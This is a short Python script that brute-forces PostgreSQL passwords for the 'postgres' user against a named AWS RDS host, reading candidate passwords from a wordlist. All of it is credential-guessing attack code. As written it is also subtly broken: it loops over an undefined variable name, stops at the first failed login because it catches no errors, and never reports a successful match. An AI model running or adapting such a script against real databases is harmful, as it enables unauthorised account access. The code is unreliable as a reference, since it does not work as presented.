import psycopg2
import time

host='postgre-db-test.c8ur2wv0ivpl.us-east-1.rds.amazonaws.com'
users_file='users.txt'
passwords_file='passwords.txt'

def bruteforce():
    user_list= open(f'{users_file}',"r")
    passwords_list= open(f'{passwords_file}',"r")

    start = time.time()

    current_user='postgres'
    # for current_user in user_list:
    for current_password in password_list:

        print(f'Testing password: {current_password}')

        engine = psycopg2.connect(
            database="postgres",
            user=current_user,
            password=current_password,
            host=host,
            port='5432'
        )

    elapsed = (time.time() - start)
    print(f'\nBruteforcing time: {elapsed}')
